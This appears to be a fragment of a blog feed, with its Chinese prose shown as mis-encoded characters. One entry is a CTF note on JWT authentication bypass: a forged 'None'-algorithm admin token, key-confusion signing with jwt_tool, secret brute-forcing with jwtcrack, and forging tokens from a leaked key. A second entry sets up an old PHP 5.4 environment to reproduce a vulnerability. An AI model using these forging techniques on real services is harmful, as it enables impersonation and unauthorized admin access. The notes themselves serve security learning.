class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>Signature æ˜¯å¯¹ Header å’Œ Payload è¿›è¡Œç­¾åï¼Œå…·ä½“æ˜¯ç”¨ä»€ä¹ˆåŠ å¯†æ–¹å¼å†™åœ¨ Header çš„ alg ä¸­ã€‚åŒæ—¶æ‹¥æœ‰è¯¥éƒ¨åˆ†çš„JWTè¢«ç§°ä¸ºJWSï¼Œä¹Ÿå°±æ˜¯ç­¾äº†åçš„JWTã€‚Signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚</p><p>ç”Ÿæˆæ–¹æ³•ä¸ºå°† header å’Œ payload ä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡ header éƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚æŠ½è±¡æˆå…¬å¼å°±æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">signature = HMAC-SHA256(base64urlEncode(header) + <span class="hljs-string">&#x27;.&#x27;</span> + base64urlEncode(payload), secret_key)<br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç  header å’Œ payload æ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸º base64urlencodeï¼Œbase64url ç¼–ç æ˜¯ base64 çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€&#x3D;â€å·ï¼Œå¹¶å°†æ ‡å‡† Base64 ä¸­çš„ â€œ+â€ å’Œ â€œ&#x2F;â€œ åˆ†åˆ«æ”¹æˆäº† â€œ-â€œ å’Œ â€œ_â€ã€‚</p><h2 id="JWTç”Ÿæˆ-åœ¨çº¿ç½‘å€-å·¥å…·"><a href="#JWTç”Ÿæˆ-åœ¨çº¿ç½‘å€-å·¥å…·" class="headerlink" title="JWTç”Ÿæˆ-åœ¨çº¿ç½‘å€&amp;å·¥å…·"></a>JWTç”Ÿæˆ-åœ¨çº¿ç½‘å€&amp;å·¥å…·</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h2><ol><li>å½“ä¸æ ¡éªŒç®—æ³•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ›¿æ¢ç®—æ³•ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨ç©ºçš„ç®—æ³•ï¼Œæ¥è¾¾åˆ°æ•°æ®ç¯¡æ”¹ç›®çš„ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><h2 id="JWT-çˆ†ç ´å·¥å…·åœ°å€"><a href="#JWT-çˆ†ç ´å·¥å…·åœ°å€" class="headerlink" title="JWT çˆ†ç ´å·¥å…·åœ°å€"></a>JWT çˆ†ç ´å·¥å…·åœ°å€</h2><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h2 id="å¯†é’¥æ··æ·†æ”»å‡»"><a href="#å¯†é’¥æ··æ·†æ”»å‡»" class="headerlink" title="å¯†é’¥æ··æ·†æ”»å‡»"></a>å¯†é’¥æ··æ·†æ”»å‡»</h2><p>JWTæœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•æ˜¯HMACå’ŒRSAã€‚HMACç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹tokenè¿›è¡Œç­¾åå’Œè®¤è¯ã€‚è€ŒRSAéœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼Œå…ˆç”¨ç§é’¥åŠ å¯†ç”ŸæˆJWTï¼Œç„¶åä½¿ç”¨å…¶å¯¹åº”çš„å…¬é’¥æ¥è§£å¯†éªŒè¯ã€‚é‚£ä¹ˆï¼Œåç«¯ä»£ç ä¼šä½¿ç”¨å…¬é’¥ä½œä¸ºç§˜å¯†å¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ç”±äºå…¬é’¥æœ‰æ—¶å¯ä»¥è¢«æ”»å‡»è€…è·å–åˆ°ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ header ä¸­ç®—æ³•ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚</p><p>åˆ©ç”¨æ–¹å¼ï¼š<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 jwt_tool.py token_here -pk pubkey -T -S hs256<br></code></pre></td></tr></table></figure><h2 id="å¯†é’¥çˆ†ç ´-æ³„éœ²"><a href="#å¯†é’¥çˆ†ç ´-æ³„éœ²" class="headerlink" title="å¯†é’¥çˆ†ç ´&#x2F;æ³„éœ²"></a>å¯†é’¥çˆ†ç ´&#x2F;æ³„éœ²</h2><p>HMACç­¾åå¯†é’¥ï¼ˆä¾‹å¦‚HS256 &#x2F; HS384 &#x2F; HS512ï¼‰ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œè¿™æ„å‘³ç€å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åçš„å¯†é’¥ä¹Ÿç”¨äºå¯¹å…¶è¿›è¡ŒéªŒè¯ã€‚ç”±äºç­¾åéªŒè¯æ˜¯ä¸€ä¸ªè‡ªåŒ…å«çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯ä»¥æµ‹è¯•ä»¤ç‰Œæœ¬èº«çš„æœ‰æ•ˆå¯†é’¥ï¼Œè€Œä¸å¿…å°†å…¶å‘é€å›åº”ç”¨ç¨‹åºè¿›è¡ŒéªŒè¯ã€‚</p><p>å› æ­¤ï¼Œjwtcrackç ´è§£æ˜¯JWTç ´è§£å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ç©·ä¸¾çš„æ–¹å¼æš´åŠ›ç ´è§£å¯†é’¥ã€‚å¦‚æœå¯ä»¥ç ´è§£HMACå¯†é’¥ï¼Œåˆ™å¯ä»¥ä¼ªé€ ä»¤ç‰Œä¸­çš„ä»»ä½•å†…å®¹ï¼Œè¿™ä¸ªæ¼æ´å°†ä¼šç»™ç³»ç»Ÿå¸¦æ¥éå¸¸ä¸¥é‡çš„åæœï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ—¶ä¸è¦ä½¿ç”¨å¼±å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./jwtcrack token_here<br></code></pre></td></tr></table></figure><h2 id="nodeå®‰è£…jwtå‘½ä»¤"><a href="#nodeå®‰è£…jwtå‘½ä»¤" class="headerlink" title="nodeå®‰è£…jwtå‘½ä»¤"></a>nodeå®‰è£…jwtå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="1-ç§é’¥æ³„éœ²"><a href="#1-ç§é’¥æ³„éœ²" class="headerlink" title="1. ç§é’¥æ³„éœ²"></a>1. ç§é’¥æ³„éœ²</h3><p>å¯ä»¥æ ¹æ®ç§é’¥ç”Ÿæˆä»»æ„çš„jwtå­—ç¬¦ä¸²ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br></code></pre></td></tr></table></figure><h3 id="2-å…¬é’¥æ³„éœ²"><a href="#2-å…¬é’¥æ³„éœ²" class="headerlink" title="2. å…¬é’¥æ³„éœ²"></a>2. å…¬é’¥æ³„éœ²</h3><p>å¯ä»¥æ ¹æ®å…¬é’¥ï¼Œä¿®æ”¹ç®—æ³•ä»éå¯¹ç§°ç®—æ³•åˆ°å¯¹ç§°å¯†é’¥ç®—æ³•ã€‚åŒæ–¹éƒ½ä½¿ç”¨å…¬é’¥éªŒç­¾ï¼Œé¡ºåˆ©ç¯¡æ”¹æ•°æ®ã€‚å½“å…¬é’¥å¯ä»¥æ‹¿åˆ°æ—¶ï¼Œå¦‚æœä½¿ç”¨å¯¹ç§°å¯†ç ï¼Œåˆ™å¯¹é¢ä½¿ç”¨ç›¸åŒçš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œå®ç°éªŒç­¾é€šè¿‡ã€‚</p><h2 id="æ€»ç»“åŠ å¯†æ–¹å¼"><a href="#æ€»ç»“åŠ å¯†æ–¹å¼" class="headerlink" title="æ€»ç»“åŠ å¯†æ–¹å¼"></a>æ€»ç»“åŠ å¯†æ–¹å¼</h2><ol><li><p><strong>éå¯¹ç§°åŠ å¯†ç®—æ³•</strong>ï¼šç§é’¥ã€å…¬é’¥ã€‚åªè¦ä¸¤ä¸ªæ—¶åŒ¹é…ï¼Œä¸€ä¸ªç§é’¥åŠ å¯†çš„æ–‡ä»¶ï¼Œç”¨å…¬é’¥éƒ½èƒ½è§£å¼€(éªŒç­¾)ã€‚</p></li><li><p><strong>å¯¹ç§°åŠ å¯†ç®—æ³•</strong>ï¼šæš—å·ã€å£ä»¤ã€å…¬é’¥ã€‚</p></li></ol><h2 id="æ€»ç»“jwtæ”»å‡»"><a href="#æ€»ç»“jwtæ”»å‡»" class="headerlink" title="æ€»ç»“jwtæ”»å‡»"></a>æ€»ç»“jwtæ”»å‡»</h2><ol><li>ç©ºå¯†ç ç®—æ³•ç»•è¿‡ï¼šä¸éªŒè¯ç®—æ³•çš„å‰æä¸‹ã€‚</li><li>å¼±å¯†ç ç»•è¿‡ï¼šçŒœæµ‹å¼±å¯†ç ã€‚</li><li>å¯†ç çˆ†ç ´ï¼šå®‰è£…dockerï¼Œæ‰§è¡Œjwtcrackerã€‚</li><li>ç§é’¥æ³„éœ²ï¼šç›´æ¥åˆ©ç”¨ç§é’¥ç”Ÿæˆæ­£ç¡®jwtå­—ç¬¦ä¸²ï¼Œè¿‡éªŒç­¾ã€‚</li><li>å…¬é’¥æ³„éœ²ï¼šä¸éªŒè¯ç®—æ³•å‰æä¸‹ï¼Œä¿®æ”¹ç®—æ³•ä¸ºå¯¹ç§°åŠ å¯†ï¼Œé€šè¿‡å…¬é’¥é‡æ–°ç”Ÿæˆå¯¹ç§°ç­¾åçš„å­—ç¬¦ä¸²ï¼Œå®ç°éªŒç­¾é€šè¿‡ã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>JWT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¤è¯ç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æºç ç¼–è¯‘å®‰è£…phpå’Œapache</title>
    <link href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/"/>
    <url>/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¤ç°ä¸€ä¸ªæ¼æ´ï¼Œéœ€è¦ php5.4 çš„ lamp ç¯å¢ƒï¼Œä½†ç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°å¾ˆå¥½çš„ç¯å¢ƒï¼Œæ‰€ä»¥è‡ªå·±æ­å»ºäº†ä¸€ä¸ªã€‚</p><h1 id="ç¼–è¯‘å®‰è£…PHP"><a href="#ç¼–è¯‘å®‰è£…PHP" class="headerlink" title="ç¼–è¯‘å®‰è£…PHP"></a>ç¼–è¯‘å®‰è£…PHP</h1><h2 id="å‰ç½®ç¯å¢ƒé…ç½®"><a href="#å‰ç½®ç¯å¢ƒé…ç½®" class="headerlink" title="å‰ç½®ç¯å¢ƒé…ç½®"></a>å‰ç½®ç¯å¢ƒé…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…docker</span><br>apt-get install docker.io<br><span class="hljs-comment"># pull ubuntu:16.04</span><br>docker pull ubuntu:16.04<br><span class="hljs-comment"># å¯åŠ¨å®¹å™¨</span><br>docker run -it -p8888:8888 ubuntu:16.04 /bin/bash<br><span class="hljs-comment">#æ›´æ¢æº</span><br><span class="hljs-built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IyMgTm90ZSwgdGhpcyBmaWxlIGlzIHdyaXR0ZW4gYnkgY2xvdWQtaW5pdCBvbiBmaXJzdCBib290IG9mIGFuIGluc3RhbmNlDQojIyBtb2RpZmljYXRpb25zIG1hZGUgaGVyZSB3aWxsIG5vdCBzdXJ2aXZlIGEgcmUtYnVuZGxlLg0KIyMgaWYgeW91IHdpc2ggdG8gbWFrZSBjaGFuZ2VzIHlvdSBjYW46DQojIyBhLikgYWRkICdhcHRfcHJlc2VydmVfc291cmNlc19saXN0OiB0cnVlJyB0byAvZXRjL2Nsb3VkL2Nsb3VkLmNmZw0KIyMgICAgIG9yIGRvIHRoZSBzYW1lIGluIHVzZXItZGF0YQ0KIyMgYi4pIGFkZCBzb3VyY2VzIGluIC9ldGMvYXB0L3NvdXJjZXMubGlzdC5kDQojIyBjLikgbWFrZSBjaGFuZ2VzIHRvIHRlbXBsYXRlIGZpbGUgL2V0Yy9jbG91ZC90ZW1wbGF0ZXMvc291cmNlcy5saXN0LnRtcGwNCg0KIyBTZWUgaHR0cDovL2hlbHAudWJ1bnR1LmNvbS9jb21tdW5pdHkvVXBncmFkZU5vdGVzIGZvciBob3cgdG8gdXBncmFkZSB0bw0KIyBuZXdlciB2ZXJzaW9ucyBvZiB0aGUgZGlzdHJpYnV0aW9uLg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQoNCiMjIE1ham9yIGJ1ZyBmaXggdXBkYXRlcyBwcm9kdWNlZCBhZnRlciB0aGUgZmluYWwgcmVsZWFzZSBvZiB0aGUNCiMjIGRpc3RyaWJ1dGlvbi4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC11cGRhdGVzIG1haW4NCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1DQojIyB0ZWFtLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIHVuaXZlcnNlIFdJTEwgTk9UIHJlY2VpdmUgYW55DQojIyByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUgc2VjdXJpdHkgdGVhbS4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsIHVuaXZlcnNlDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1IA0KIyMgdGVhbSwgYW5kIG1heSBub3QgYmUgdW5kZXIgYSBmcmVlIGxpY2VuY2UuIFBsZWFzZSBzYXRpc2Z5IHlvdXJzZWxmIGFzIHRvDQojIyB5b3VyIHJpZ2h0cyB0byB1c2UgdGhlIHNvZnR3YXJlLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIA0KIyMgbXVsdGl2ZXJzZSBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUNCiMjIHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgbXVsdGl2ZXJzZQ0KIyBkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtdWx0aXZlcnNlDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gdGhlICdiYWNrcG9ydHMnDQojIyByZXBvc2l0b3J5Lg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBtYXkgbm90IGhhdmUgYmVlbiB0ZXN0ZWQgYXMNCiMjIGV4dGVuc2l2ZWx5IGFzIHRoYXQgY29udGFpbmVkIGluIHRoZSBtYWluIHJlbGVhc2UsIGFsdGhvdWdoIGl0IGluY2x1ZGVzDQojIyBuZXdlciB2ZXJzaW9ucyBvZiBzb21lIGFwcGxpY2F0aW9ucyB3aGljaCBtYXkgcHJvdmlkZSB1c2VmdWwgZmVhdHVyZXMuDQojIyBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIGJhY2twb3J0cyBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcNCiMjIG9yIHVwZGF0ZXMgZnJvbSB0aGUgVWJ1bnR1IHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtYmFja3BvcnRzIG1haW4gcmVzdHJpY3RlZCB1bml2ZXJzZSBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLWJhY2twb3J0cyBtYWluIHJlc3RyaWN0ZWQgdW5pdmVyc2UgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gQ2Fub25pY2FsJ3MNCiMjICdwYXJ0bmVyJyByZXBvc2l0b3J5Lg0KIyMgVGhpcyBzb2Z0d2FyZSBpcyBub3QgcGFydCBvZiBVYnVudHUsIGJ1dCBpcyBvZmZlcmVkIGJ5IENhbm9uaWNhbCBhbmQgdGhlDQojIyByZXNwZWN0aXZlIHZlbmRvcnMgYXMgYSBzZXJ2aWNlIHRvIFVidW50dSB1c2Vycy4NCiMgZGViIGh0dHA6Ly9hcmNoaXZlLmNhbm9uaWNhbC5jb20vdWJ1bnR1IHhlbmlhbCBwYXJ0bmVyDQojIGRlYi1zcmMgaHR0cDovL2FyY2hpdmUuY2Fub25pY2FsLmNvbS91YnVudHUgeGVuaWFsIHBhcnRuZXINCg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IHVuaXZlcnNlDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSB1bml2ZXJzZQ0KIyBkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IG11bHRpdmVyc2UNCiMgZGViLXNyYyBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtc2VjdXJpdHkgbXVsdGl2ZXJzZQ==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt; /etc/apt/sources.list<br><br><span class="hljs-comment"># å®‰è£…å¿…è¦ç¯å¢ƒ</span><br>apt-get install vim wget net-tools curl<br><br><span class="hljs-comment"># å®‰è£…ç¼–è¯‘phpéœ€è¦çš„ç¯å¢ƒ eg:https://github.com/php/php-src#building-php-source-code</span><br><span class="hljs-comment"># å®‰è£…apache2-devæ˜¯å› ä¸ºphpåªèƒ½åœ¨ç¼–è¯‘æ—¶è½½å…¥apacheæ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦--with-apxs2å‚æ•°</span><br>apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev apache2 apache2-dev<br></code></pre></td></tr></table></figure><h2 id="ä¸‹è½½å¹¶ç¼–è¯‘å®‰è£…php"><a href="#ä¸‹è½½å¹¶ç¼–è¯‘å®‰è£…php" class="headerlink" title="ä¸‹è½½å¹¶ç¼–è¯‘å®‰è£…php"></a>ä¸‹è½½å¹¶ç¼–è¯‘å®‰è£…php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#ä¸‹è½½è§£å‹php-5.4.45 eg: https://www.php.net/releases/</span><br><span class="hljs-built_in">cd</span> /root<br>wget https://www.php.net/distributions/php-5.4.45.tar.bz2<br>tar jxvf php-5.4.45.tar.bz2<br><br><span class="hljs-comment"># ç¼–è¯‘php-5.4.45  å‚æ•°å¯é€šè¿‡ ./configure -h æŸ¥çœ‹</span><br><span class="hljs-built_in">cd</span> php-5.4.45<br>./buildconf --force<br>./configure --prefix=/home/php/php5445 --exec-prefix=/home/php/php5445/execdir --with-apxs2<br>make<br>make install<br><span class="hljs-comment"># ä¸‹é¢è¿™ä¸ªå‘½ä»¤æ˜¯make install 